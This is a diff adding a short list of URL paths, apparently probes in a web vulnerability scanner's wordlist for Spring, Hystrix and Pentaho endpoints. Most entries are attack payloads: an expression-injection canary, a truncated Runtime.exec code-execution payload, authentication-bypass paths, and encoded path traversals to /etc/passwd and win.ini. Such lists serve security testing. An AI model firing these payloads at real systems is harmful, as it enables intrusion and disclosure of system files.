@@ -1,0 +1,11 @@
+/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test
+/hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec(
+/pentaho/api/userrolelist/systemRoles?require-cfg.js
+/api/userrolelist/systemRoles?require-cfg.js
+/static/link/%2e%2e/etc/passwd
+/error
+/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
+/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
+/profile
+/api/profile
+/alps/profile
